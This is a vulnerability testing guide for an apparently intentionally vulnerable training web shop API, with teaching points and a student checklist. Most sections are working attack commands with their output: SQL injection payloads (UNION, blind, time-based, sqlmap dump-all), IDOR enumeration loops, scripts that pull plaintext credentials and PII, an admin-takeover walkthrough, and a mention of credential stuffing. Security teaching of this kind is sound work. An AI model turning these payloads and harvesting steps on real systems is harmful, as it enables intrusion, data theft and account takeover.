# JSON API Endpoints - Vulnerability Testing Guide

## 🎯 Overview

**Base URL:** https://shopease.zevonai.com/api  
**OWASP Categories:** A01 (Broken Access Control), A03 (Injection), A05 (Security Misconfiguration)  
**Format:** JSON REST API

---

## 📋 API Endpoints

### 1. **GET /api** - API Documentation ✅

**Purpose:** Lists all available API endpoints  
**Auth Required:** No

**Example:**
```bash
curl https://shopease.zevonai.com/api
```

**Response:**
```json
{
  "success": true,
  "message": "ShopEase API v1.0",
  "endpoints": [...]
}
```

---

### 2. **GET /api/me** - Current User Info 🔐

**Purpose:** Get authenticated user details  
**Auth Required:** YES  
**Vulnerability:** Session-based auth only, exposes session ID

**Test 1: Without Authentication**
```bash
curl https://shopease.zevonai.com/api/me
```

**Response:**
```json
{
  "success": false,
  "error": "Unauthorized",
  "message": "Authentication required. Please login first."
}
```

**Test 2: With Authentication**
```bash
# Login first
curl -X POST https://shopease.zevonai.com/login \
  -d "email=rajesh@gmail.com&password=password123" \
  -c cookies.txt

# Then access API
curl -b cookies.txt https://shopease.zevonai.com/api/me
```

**Response:**
```json
{
  "success": true,
  "data": {
    "id": 2,
    "name": "Rajesh Kumar",
    "email": "rajesh@gmail.com",
    "role": "user",
    "phone": "9123456789",
    "address": "45 MG Road, Bangalore, Karnataka 560001",
    "profile_picture": null,
    "member_since": "2026-06-26T06:56:41.000Z",
    "session_id": "abc123..."  // ⚠️ Vulnerable: Session ID exposed
  }
}
```

**Vulnerabilities:**
- Exposes session ID in response
- No rate limiting
- Returns all user PII

---

### 3. **GET /api/users** - List All Users ⚠️ CRITICAL

**Purpose:** List all registered users  
**Auth Required:** NO (Major vulnerability!)  
**Vulnerability:** No authentication, exposes plain text passwords

**Exploitation:**
```bash
curl https://shopease.zevonai.com/api/users
```

**Response:**
```json
{
  "success": true,
  "count": 8,
  "data": [
    {
      "id": 1,
      "name": "Admin User",
      "email": "admin@shopease.in",
      "password": "admin123",  // ⚠️ Plain text password!
      "role": "admin",
      "phone": "9876543210",
      "address": "123 Admin Street, Mumbai, Maharashtra 400001",
      "created_at": "2026-06-26T06:56:41.000Z"
    },
    ...
  ]
}
```

**Impact:**
- ✅ No authentication required
- ✅ Exposes ALL user passwords in plain text
- ✅ Exposes all PII (addresses, phone numbers)
- ✅ Perfect for credential stuffing attacks

**Attack Scenario:**
```bash
# Download all users
curl https://shopease.zevonai.com/api/users > users.json

# Extract emails and passwords
cat users.json | jq -r '.data[] | "\(.email):\(.password)"'
```

**Output:**
```
admin@shopease.in:admin123
rajesh@gmail.com:password123
priya.sharma@yahoo.com:user1234
...
```

---

### 4. **GET /api/user/:id** - Get Specific User ⚠️ HIGH

**Purpose:** Get user by ID  
**Auth Required:** NO  
**Vulnerabilities:** IDOR, SQL Injection, Password Exposure

**Test 1: IDOR - Access Any User**
```bash
# Access user ID 1 (admin)
curl https://shopease.zevonai.com/api/user/1

# Access user ID 7 (strawhat)
curl https://shopease.zevonai.com/api/user/7
```

**Response:**
```json
{
  "success": true,
  "data": {
    "id": 7,
    "name": "strawhat",
    "email": "strawhattemp6@gmail.com",
    "password": "Temp6@1234",  // ⚠️ Exposed!
    "role": "user",
    "phone": null,
    "address": null,
    "profile_picture": null,
    "created_at": "2026-06-26T07:00:08.000Z"
  }
}
```

**Test 2: SQL Injection**
```bash
# Inject SQL to get all users
curl "https://shopease.zevonai.com/api/user/1%20OR%201=1%20--%20-"

# UNION-based injection
curl "https://shopease.zevonai.com/api/user/1%20UNION%20SELECT%20NULL,email,password,NULL,NULL,NULL,NULL,NULL%20FROM%20users--"
```

**Vulnerabilities:**
- No authentication
- No authorization (can view any user)
- SQL injection in ID parameter
- Returns plain text password

---

### 5. **GET /api/users/search?q=query** - Search Users ⚠️ HIGH

**Purpose:** Search users by name or email  
**Auth Required:** NO  
**Vulnerability:** SQL Injection, Query Disclosure

**Normal Usage:**
```bash
curl "https://shopease.zevonai.com/api/users/search?q=rajesh"
```

**Response:**
```json
{
  "success": true,
  "count": 1,
  "query": "SELECT id, name, email, role FROM users WHERE name LIKE '%rajesh%' OR email LIKE '%rajesh%'",
  "data": [
    {
      "id": 2,
      "name": "Rajesh Kumar",
      "email": "rajesh@gmail.com",
      "role": "user"
    }
  ]
}
```

**SQL Injection Exploitation:**

```bash
# Test 1: Error-based SQLi
curl "https://shopease.zevonai.com/api/users/search?q=test'"

# Test 2: UNION-based to extract passwords
curl "https://shopease.zevonai.com/api/users/search?q=x'%20UNION%20SELECT%20id,name,email,password%20FROM%20users--%20-"

# Test 3: Boolean-based blind SQLi
curl "https://shopease.zevonai.com/api/users/search?q=x'%20OR%20'1'='1"

# Test 4: Time-based blind SQLi
curl "https://shopease.zevonai.com/api/users/search?q=x'%20OR%20SLEEP(5)--"
```

**Vulnerabilities:**
- SQL query exposed in response
- SQL injection via search parameter
- SQL errors exposed
- No authentication

---

### 6. **GET /api/products** - List Products ✅

**Purpose:** Get all products  
**Auth Required:** NO

```bash
curl https://shopease.zevonai.com/api/products
```

**Response:**
```json
{
  "success": true,
  "count": 20,
  "data": [...]
}
```

---

### 7. **GET /api/product/:id** - Get Product ⚠️ MEDIUM

**Purpose:** Get product by ID  
**Auth Required:** NO  
**Vulnerability:** SQL Injection

**SQL Injection:**
```bash
# Get all products
curl "https://shopease.zevonai.com/api/product/1%20OR%201=1%20--%20-"

# Extract from other tables
curl "https://shopease.zevonai.com/api/product/1%20UNION%20SELECT%20id,email,password,NULL,NULL,NULL,NULL%20FROM%20users--"
```

---

### 8. **GET /api/orders/:userId** - Get User Orders ⚠️ HIGH

**Purpose:** Get orders for a specific user  
**Auth Required:** NO  
**Vulnerability:** IDOR - Can view any user's orders

**Exploitation:**
```bash
# View user 2's orders
curl https://shopease.zevonai.com/api/orders/2

# View user 3's orders (not your own)
curl https://shopease.zevonai.com/api/orders/3

# Enumerate all orders
for i in {1..10}; do
  curl https://shopease.zevonai.com/api/orders/$i
done
```

**Response:**
```json
{
  "success": true,
  "count": 2,
  "data": [
    {
      "id": 1,
      "user_id": 2,
      "total": "159900.00",
      "status": "Delivered",
      "address": "45 MG Road, Bangalore, Karnataka 560001",
      "created_at": "2024-05-15T10:30:00.000Z"
    }
  ]
}
```

**Impact:**
- View any user's order history
- See delivery addresses
- See purchase amounts
- No authentication required

---

### 9. **GET /api/info** - Server Information ⚠️ HIGH

**Purpose:** Server metadata  
**Auth Required:** NO  
**Vulnerability:** Information Disclosure

**Exploitation:**
```bash
curl https://shopease.zevonai.com/api/info
```

**Response:**
```json
{
  "success": true,
  "data": {
    "app": "ShopEase",
    "version": "1.0.0",
    "environment": "production",
    "node_version": "v16.20.2",
    "platform": "linux",
    "uptime": 48.80803889,
    "memory_usage": {
      "rss": 54661120,
      "heapTotal": 13402112,
      "heapUsed": 11797496
    },
    "database": {
      "host": "db",
      "name": "shopease",
      "user": "shopease_user"  // ⚠️ DB credentials exposed!
    },
    "session_secret": "secret123"  // ⚠️ Session secret exposed!
  }
}
```

**Information Leaked:**
- Database hostname
- Database username
- Session secret (can forge sessions!)
- Node version (check for CVEs)
- Server platform
- Memory usage (for DoS attacks)

---

## 🧪 Complete Testing Scenarios

### Scenario 1: Mass Credential Harvesting

```bash
# Step 1: Discover API
curl https://shopease.zevonai.com/api

# Step 2: Download all users
curl https://shopease.zevonai.com/api/users -o users.json

# Step 3: Extract credentials
cat users.json | jq -r '.data[] | "\(.email):\(.password)"' > credentials.txt

# Step 4: Test credentials on other sites (credential stuffing)
```

**Impact:** Complete user database compromise

---

### Scenario 2: Admin Account Takeover

```bash
# Step 1: Find admin credentials
curl https://shopease.zevonai.com/api/users | jq '.data[] | select(.role=="admin")'

# Output: admin@shopease.in:admin123

# Step 2: Login as admin
curl -X POST https://shopease.zevonai.com/login \
  -d "email=admin@shopease.in&password=admin123" \
  -c admin_cookies.txt

# Step 3: Access admin panel
curl -b admin_cookies.txt https://shopease.zevonai.com/zevon-admin
```

---

### Scenario 3: PII Data Breach

```bash
# Extract all user PII
curl https://shopease.zevonai.com/api/users | \
  jq -r '.data[] | {name, email, phone, address}' > pii_leak.json

# Result: All addresses, phone numbers, emails exposed
```

---

### Scenario 4: SQL Injection via API

```bash
# Extract database structure
curl "https://shopease.zevonai.com/api/users/search?q=x'%20UNION%20SELECT%201,TABLE_NAME,TABLE_SCHEMA,4%20FROM%20information_schema.TABLES--"

# Dump all tables
sqlmap -u "https://shopease.zevonai.com/api/product/1*" \
  --batch --dump-all
```

---

## 📊 Vulnerability Summary

| Endpoint | Auth | Vulnerabilities | Severity |
|----------|------|----------------|----------|
| `/api/me` | YES | Session ID exposure | MEDIUM |
| `/api/users` | NO | Password exposure, No auth | CRITICAL |
| `/api/user/:id` | NO | IDOR, SQLi, Password exposure | CRITICAL |
| `/api/users/search` | NO | SQL Injection, Query disclosure | HIGH |
| `/api/products` | NO | None (intended public) | LOW |
| `/api/product/:id` | NO | SQL Injection | MEDIUM |
| `/api/orders/:userId` | NO | IDOR, No authorization | HIGH |
| `/api/info` | NO | Info disclosure, Credentials | HIGH |

---

## 🎓 Teaching Points

### Key Lessons:

1. **Authentication ≠ Authorization**
   - `/api/me` requires login
   - `/api/users` doesn't (should require auth)
   - `/api/orders/:userId` lets you view anyone's orders

2. **Never Expose Passwords**
   - `/api/users` returns plain text passwords
   - Even hashed passwords shouldn't be in API responses

3. **Input Validation**
   - All ID parameters vulnerable to SQL injection
   - Search parameter completely unvalidated

4. **Information Disclosure**
   - `/api/info` exposes database credentials
   - Error messages expose SQL queries
   - Stack traces in error responses

5. **API Security Best Practices:**
   - ✅ Use authentication on all sensitive endpoints
   - ✅ Implement authorization checks
   - ✅ Use parameterized queries
   - ✅ Never expose passwords in responses
   - ✅ Rate limiting on all endpoints
   - ✅ Don't expose internal system info

---

## ✅ Quick Testing Checklist

**For Students:**

- [ ] Access `/api` - view API documentation
- [ ] Access `/api/me` without login - get 401 Unauthorized
- [ ] Access `/api/users` - see ALL passwords
- [ ] Access `/api/user/1` - view admin password
- [ ] Test `/api/users/search?q=test'` - trigger SQL error
- [ ] Access `/api/orders/2` - view other user's orders
- [ ] Access `/api/info` - see database credentials
- [ ] Use sqlmap on any ID parameter - dump database
- [ ] Extract all emails and passwords - credential list
- [ ] Login with stolen admin credentials - full access

---

## 🔗 Tools for Testing

**Burp Suite:**
```
1. Proxy browser traffic
2. Send API requests to Repeater
3. Test different user IDs (Intruder)
4. Modify parameters for SQLi
```

**Postman:**
```
1. Create collection for all endpoints
2. Test with/without authentication
3. Automate IDOR testing
4. Export results
```

**curl + jq:**
```bash
# Pretty print JSON
curl https://shopease.zevonai.com/api/users | jq

# Extract specific fields
curl https://shopease.zevonai.com/api/users | jq '.data[] | {email, password}'

# Save to file
curl https://shopease.zevonai.com/api/users -o users.json
```

**Python Script:**
```python
import requests

# Get all users
response = requests.get('https://shopease.zevonai.com/api/users')
users = response.json()['data']

# Extract credentials
for user in users:
    print(f"{user['email']}:{user['password']}")
```

---

**Base URL:** https://shopease.zevonai.com/api  
**Status:** ✅ DEPLOYED  
**Last Updated:** July 24, 2026
